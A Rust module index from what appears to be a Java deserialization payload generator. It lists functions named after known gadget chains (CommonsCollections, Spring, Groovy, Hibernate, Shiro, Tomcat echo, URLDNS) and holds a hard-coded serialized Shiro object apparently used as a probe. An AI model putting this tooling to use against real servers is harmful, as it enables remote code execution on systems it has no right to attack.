pub use cb1::get_commons_beanutils1;
pub use cc_n::{
    get_commons_collections1, get_commons_collections2, get_commons_collections3,
    get_commons_collections4, get_commons_collections5, get_commons_collections6,
    get_commons_collections7,
};
pub use cck_n::{
    get_commons_collections_k1, get_commons_collections_k2, get_commons_collections_k3,
    get_commons_collections_k4,
};
pub use clojure::get_clojure;
pub use groovy1::get_groovy1;
pub use hibernate::{get_hibernate1, get_hibernate2};
pub use javassist_weld1::get_javassist_weld1;
pub use jboss_interceptors1::get_jboss_interceptors1;
pub use jdk7u21::get_jdk7u21;
pub use jdk8u20::get_jdk8u20;
pub use json1::get_json1;
pub use mozilla_rhino::{get_mozilla_rhino1, get_mozilla_rhino2};
pub use myfaces::get_myfaces1;
pub use rome::get_rome;
pub use shiro::get_shiro_simple_principal_collection;
pub use spring::{get_spring1, get_spring2};
pub use tomcat_echo::{get_cck1_tomcat_echo, get_cck2_tomcat_echo,get_cck1_tomcat_echo_gelen};
pub use url_dns::{get_c3p0, get_url_dns};
pub use vaadin::get_vaadin1;


mod payload;

mod base;
mod cb1;
mod cc_n;
mod cck_n;
mod clojure;
mod groovy1;
mod hibernate;
mod javassist_weld1;
mod jboss_interceptors1;
mod jdk7u21;
mod jdk8u20;
mod json1;
mod mozilla_rhino;
mod myfaces;
mod rome;
mod shiro;
mod spring;
mod template_impl;
mod tomcat_echo;
mod url_dns;
mod util;
mod vaadin;


pub fn get_test_payload() -> Vec<u8> {
    vec![172,237,0,5,115,114,0,50,111,114,103,46,97,112,97,99,104,101,46,115,104,105,114,111,46,115,117,98,106,101,99,116,46,83,105,109,112,108,101,80,114,105,110,99,105,112,97,108,67,111,108,108,101,99,116,105,111,110,168,127,88,37,198,163,8,74,3,0,1,76,0,15,114,101,97,108,109,80,114,105,110,99,105,112,97,108,115,116,0,15,76,106,97,118,97,47,117,116,105,108,47,77,97,112,59,120,112,112,119,1,0,120]
}
    